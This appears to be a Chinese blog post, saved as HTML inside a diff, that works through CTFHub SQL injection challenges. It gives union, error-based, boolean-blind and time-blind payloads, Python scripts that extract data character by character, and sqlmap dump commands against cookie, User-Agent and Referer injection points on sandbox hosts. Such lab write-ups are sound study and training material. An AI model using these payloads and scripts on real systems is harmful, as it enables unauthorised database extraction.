@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言：&amp;emsp;知识总是学了又忘忘了再学的过程吧 ？ 每一次再学的过程会轻松很多倒是真的，因为每一次再学可能都是一次深入了解。加油！ 整数形注入&amp;emsp;最后使用的payload-1 union select 11,group_concat(flag) from flag值的注意的几个点：  要使原来的数据不显示，才可以显示我们想要的结果。如把id&#x3D;-1 表中没有这个项就显示了我们想要的结果。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFHub 之 sql注入 (1)">
+<meta property="og:url" content="https://mayi077.github.io/2020/03/12/CTFHub-%E4%B9%8B-sql%E6%B3%A8%E5%85%A5-1/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="前言：&amp;emsp;知识总是学了又忘忘了再学的过程吧 ？ 每一次再学的过程会轻松很多倒是真的，因为每一次再学可能都是一次深入了解。加油！ 整数形注入&amp;emsp;最后使用的payload-1 union select 11,group_concat(flag) from flag值的注意的几个点：  要使原来的数据不显示，才可以显示我们想要的结果。如把id&#x3D;-1 表中没有这个项就显示了我们想要的结果。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.downk.cc/item/5e6848c098271cb2b800e801.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e699c0ae83c3a1e3ae1826a.jpg">
+<meta property="article:published_time" content="2020-03-12T08:56:19.000Z">
+<meta property="article:modified_time" content="2020-03-17T07:52:41.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="基础积累">
+<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.downk.cc/item/5e6848c098271cb2b800e801.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/03/12/CTFHub-%E4%B9%8B-sql%E6%B3%A8%E5%85%A5-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>CTFHub 之 sql注入 (1) | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/03/12/CTFHub-%E4%B9%8B-sql%E6%B3%A8%E5%85%A5-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTFHub 之 sql注入 (1)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-12 16:56:19" itemprop="dateCreated datePublished" datetime="2020-03-12T16:56:19+08:00">2020-03-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-17 15:52:41" itemprop="dateModified" datetime="2020-03-17T15:52:41+08:00">2020-03-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%97%A5%E5%B8%B8%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">日常笔记</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>14 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>&emsp;知识总是学了又忘忘了再学的过程吧 ？ 每一次再学的过程会轻松很多倒是真的，因为每一次再学可能都是一次深入了解。加油！</p>
+<h3 id="整数形注入"><a href="#整数形注入" class="headerlink" title="整数形注入"></a>整数形注入</h3><p>&emsp;最后使用的payload<code>-1 union select 11,group_concat(flag) from flag</code><br>值的注意的几个点：</p>
+<ul>
+<li>要使原来的数据不显示，才可以显示我们想要的结果。如把<code>id=-1</code> 表中没有这个项就显示了我们想要的结果。</li>
+<li>注意括号不要乱打，出了错可以把payload copy下来仔细观察。</li>
+<li>union select 就是在原来显示的基础上再加一条数据（列数和前面一样）<br><a href="https://pic.downk.cc/item/5e6848c098271cb2b800e801.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e6848c098271cb2b800e801.jpg" alt=""></a></li>
+</ul>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>&emsp;和整数型注入唯一区别就是 需要闭合。<br>最后的payload <code>-1&#39;union select 1,group_concat(flag) from flag--+</code><br>记个单词:</p>
+<ul>
+<li>schema 模式</li>
+</ul>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>&emsp;报错注入有蛮多中方法，但是我一般使用的就那么2种。</p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>&emsp;它是我使用最多的一种，因为好记。但是它爆出来的字符最多只有 32 个，而且<strong>不适用于MySQL小于5.1.5的版本</strong>。<br>使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id&#x3D;1 and (updatexml(1,concat(&#39;~&#39;,(right((select group_concat(flag) from flag),70)),&#39;~&#39;),1)) </span><br><span class="line"></span><br><span class="line">因为updatexml最多只能报32个字符，所以需要借助right函数来对2次然后拼接 flag </span><br><span class="line"></span><br><span class="line">基本 样式是：</span><br><span class="line"></span><br><span class="line">select * from user where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line">会报出当前用户</span><br></pre></td></tr></table></figure>
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>&emsp;这种方式没有字符的限制，但是比较难记呀而且原表里要有3条以上记录。<a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">【报错原理】</a><br>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from user group by x)a);</span><br></pre></td></tr></table></figure>
+<p>上面给的链接已说明了报错原理，下面我们来说下怎么利用。</p>
+<ol>
+<li><code>select count(*),(floor(rand()*2))a from _sql group by a;</code> 使用这个语句报错出 1，1是哪里来的呢？我们怎么利用呢？ </li>
+<li>其实是因为 floor(rand(0)*2)创建的虚表出现了主键重复所以报错并把这一列信息报错出来。</li>
+<li>所以其实报错信息是 (floor(rand()*2))a 这里来的。那么我们只要在这里加入我们想要的查询语句即可。</li>
+<li><code>select count(*),concat((select user()),floor(rand(0)*2))x from tablename group by x;</code>而其中的<code>tablename</code>是表名只要在库中存在即可。 </li>
+<li>值得注意的是<code>concat((select user()),floor(rand(0)*2))x</code> 不能出现<code>group_concat()</code> ,需要使用 <code>limit 0,1</code> 来进行一条条的读取。如:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat((select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))a</span><br></pre></td></tr></table></figure></li>
+<li>这里值得注意的是使用 union select 要和前面字段数量一样。</li>
+<li>再来看看 payload 中的 <code>select 1 from(...)a</code>我们实验不是不加这个也可以吗？对的，但是如果不确定前面有几列的话就需要这样了，加了这个语句后他会先执行 <code>from（。。）a</code> from 括号里的内容就会先报出我们先要的数据而不是列数不匹配。值得注意的是 <code>form ()a</code>这个别名a必须给，否者报错必须有自己的表。  </li>
+</ol>
+<p><strong>就先这样把，其它的遇到再补充</strong></p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>&emsp;这题和一般的布尔注入不太一样，一般的是查询数据为空报错，而这题只有查询成功和不成功。</p>
+<ol>
+<li>我们利用 if() 语句来构造payload。值得注意的是使用if 语句时先会进行整体的判断如果有错就直接报错。</li>
+<li>我们可以利用<code>if(x=1,1,select &#39;a&#39;);</code>来进行一个一个字符的爆破。<br><a href="https://pic.downk.cc/item/5e699c0ae83c3a1e3ae1826a.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e699c0ae83c3a1e3ae1826a.jpg" alt=""></a></li>
+<li>经过查阅可以使用<code>if(x=1,1,select table_name from information_schema.tables);</code>这种方法来测试。</li>
+<li>然后就是常规的布尔盲注了，下面贴一个代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import  requests</span><br><span class="line">import string</span><br><span class="line">url1&#x3D;&quot;http:&#x2F;&#x2F;challenge-ee44b901e909271f.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;&quot;</span><br><span class="line">database_name&#x3D;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def database():</span><br><span class="line">    for a in range(10):</span><br><span class="line">        for b in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:</span><br><span class="line">            payload&#x3D;&#39;if(substr(database(),&#123;0&#125;,1)&#x3D;&quot;&#123;1&#125;&quot;,1,(select table_name from information_schema.tables))&#39;.format(a,b)</span><br><span class="line">            url&#x3D;url1+payload</span><br><span class="line">            r&#x3D;requests.get(url)</span><br><span class="line">            if &quot;query_success&quot; in r.text:</span><br><span class="line">                global  database_name</span><br><span class="line">                database_name+&#x3D;b</span><br><span class="line">                print(database_name)</span><br><span class="line">                break</span><br><span class="line">        print(&quot;database_name: &quot;+database_name)</span><br><span class="line"></span><br><span class="line">def table():</span><br><span class="line">    list &#x3D; []</span><br><span class="line">    for k in range(0, 4):</span><br><span class="line">            table_name &#x3D; &quot;&quot;</span><br><span class="line">            for j in range(1, 9):</span><br><span class="line">                for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:</span><br><span class="line">                    url &#x3D; url1 + &#39;if(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit &#123;&#125;,1),&#123;&#125;,1)&#x3D;&quot;&#123;&#125;&quot;,1,(select table_name from information_schema.tables))&#39;.format(k, j, i)</span><br><span class="line">                # print(url+&#39;%23&#39;)</span><br><span class="line">                    r &#x3D; requests.get(url)</span><br><span class="line"></span><br><span class="line">                    if &quot;query_success&quot;in r.text:</span><br><span class="line">                        table_name &#x3D; table_name + i</span><br><span class="line">                        break</span><br><span class="line">            list.append(table_name)</span><br><span class="line">    print(&#39;table_name:&#39;, list)</span><br><span class="line">def column(table):</span><br><span class="line">         print(table)</span><br><span class="line">         list &#x3D; []</span><br><span class="line">         for k in range(0, 3):</span><br><span class="line">            name &#x3D; &#39;&#39;</span><br><span class="line">            for j in range(1, 9):</span><br><span class="line">                 for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:</span><br><span class="line">                     url &#x3D; url1 + &#39;if(substr((select column_name from information_schema.columns where table_name&#x3D;&quot;%s&quot; limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; % (table,k, j, i)</span><br><span class="line">                     r &#x3D; requests.get(url)</span><br><span class="line">                     if &quot;query_success&quot; in r.text:</span><br><span class="line">                         name &#x3D; name + i</span><br><span class="line">                         break</span><br><span class="line">            if name!&#x3D;&quot;&quot; :</span><br><span class="line">                list.append(name)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">         print(&#39;column_name:&#39;, list)</span><br><span class="line">def data(table,colmn):</span><br><span class="line">    data&#x3D;&#39;&#39;</span><br><span class="line">    print(table,colmn)</span><br><span class="line">    for a in range(1,50):</span><br><span class="line">        for b in (48,126):  ###SQL中并不区分大小写所以可能出错</span><br><span class="line">            url&#x3D;url1+&#39;if(ascii(substr((select flag from flag),%d,1))&#x3D;%d,1,(select table_name from information_schema.tables))&#39; % (a, b)</span><br><span class="line">            r&#x3D;requests.get(url)</span><br><span class="line">            if &quot;query_success&quot; in r.text:</span><br><span class="line">                data&#x3D;data+chr(b)</span><br><span class="line">                print(data)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;data: &quot;+data)</span><br><span class="line">data(&quot;flag&quot;,&quot;flag&quot;)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>值得注意的是发现<strong>mysql 不区分大小写</strong></p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>&emsp;和布尔盲注的区别在于它没有回显。但是我们可以使用一些函数使它响应时间变长如sleep函数，然后根据响应时间的快慢来确定我们的猜测是否正确。判断是否存在可以使用 sleep 函数然后打开开发者模式-》网络 找到发送的那条数据看它的响应时间<br>&emsp;那么我们使用脚本怎么判断他是多长时间响应的呢？我们可以使用 python 的异常处理加上发送请求是加上<code>outtime=多少</code>，也就是过了这么多秒没有反应就抛出异常。如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">        r &#x3D; requests.get(url,timeout&#x3D;6)</span><br><span class="line"></span><br><span class="line">except requests.exceptions.ReadTimeout:</span><br><span class="line">        name &#x3D; name + chr(i)</span><br><span class="line">        print(name)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+
+
+<p>这题的脚本如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url1&#x3D;r&quot;http:&#x2F;&#x2F;challenge-7c22b72dd5e98d7a.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;&quot;</span><br><span class="line">def get_data():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 50): </span><br><span class="line">        for i in range(48, 126):</span><br><span class="line">            url &#x3D; url1 + &#39;if(ascii(substr((select flag from flag),%d,1))&#x3D;%d,sleep(2),1)&#39; % (j, i)</span><br><span class="line">            try:</span><br><span class="line">                r &#x3D; requests.get(url,timeout&#x3D;6)</span><br><span class="line"></span><br><span class="line">            except requests.exceptions.ReadTimeout:</span><br><span class="line">                    name &#x3D; name + chr(i)</span><br><span class="line">                    print(name)</span><br><span class="line">                    break</span><br><span class="line">    print(&#39;value:&#39;, name)</span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>
+<p><strong>补充</strong> 判断也可用time.teme()这个函数来判定返回时间。</p>
+<h3 id="MySQL-结构"><a href="#MySQL-结构" class="headerlink" title="MySQL 结构"></a>MySQL 结构</h3><p>&emsp;就是简单的数字型注入。id=1 and 1=2 即可找到注入点了。然后一步步脱裤即可。</p>
+<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>&emsp;注入点是cookie值，使用bp抓包 然后改 cookie中的id即可以一步步报错flag 我这里使用的是 sqlmap 命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;challenge-3072f06bf63894aa.sandbox.ctfhub.com:10080&#x2F; --cookie &quot;id&#x3D;1*&quot; --dump -T imwjxflmur -D sqli</span><br></pre></td></tr></table></figure>
+<h3 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h3><p>&emsp; 跟cookie 注入类似就是注入点换了。我们使用bp抓包然后进行一步步注入。</p>
+<ol>
+<li>我们把抓到的包放到bp重放当中然后将 <code>User-Agent</code> 出改为一然后发现这里是注入点，即可以一步步爆出flag。</li>
+<li>这里我们使用 sqlmap 。首先将抓到的包复制成文本文件保存（在存在注入点的后面加 * 号）</li>
+<li>使用以下命令爆出flag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r d:&#x2F;1.txt --dump -C nuibmngspm -D sqli -T pkugmlsuoo</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h3 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h3><p>&emsp;又是一个头部信息注入，没什么可讲的。在数据包的头中加入<code>referer:1*</code>然后保存为文件然后sqlmap吧<br>命令为：</p>
+<pre><code>python sqlmap.py -r d:/1.txt --dump -D sqli -T xgjvwvravx</code></pre><p><strong>结尾</strong> 暂时平台只更新了这么多sql注入的题目。就现记录都这里了。后续更新！</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/03/12/CTFHub-%E4%B9%8B-sql%E6%B3%A8%E5%85%A5-1/" title="CTFHub 之 sql注入 (1)">https://mayi077.github.io/2020/03/12/CTFHub-之-sql注入-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>基础积累</a>
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i>学习笔记</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i>sql注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/10/SVN-%E6%B3%84%E6%BC%8F-%E5%8F%8A-%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/" rel="prev" title="SVN 泄漏 及 利用工具">
+      <i class="fa fa-chevron-left"></i> SVN 泄漏 及 利用工具
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/13/CTGHub-%E4%B9%8B-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next" title="CTGHub  之 文件上传">
+      CTGHub  之 文件上传 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#整数形注入"><span class="nav-number">2.</span> <span class="nav-text">整数形注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#字符型注入"><span class="nav-number">3.</span> <span class="nav-text">字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">4.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml"><span class="nav-number">4.1.</span> <span class="nav-text">updatexml()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#floor"><span class="nav-number">4.2.</span> <span class="nav-text">floor()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#布尔盲注"><span class="nav-number">5.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#时间盲注"><span class="nav-number">6.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-结构"><span class="nav-number">7.</span> <span class="nav-text">MySQL 结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie注入"><span class="nav-number">8.</span> <span class="nav-text">Cookie注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UA注入"><span class="nav-number">9.</span> <span class="nav-text">UA注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Referer注入"><span class="nav-number">10.</span> <span class="nav-text">Referer注入</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
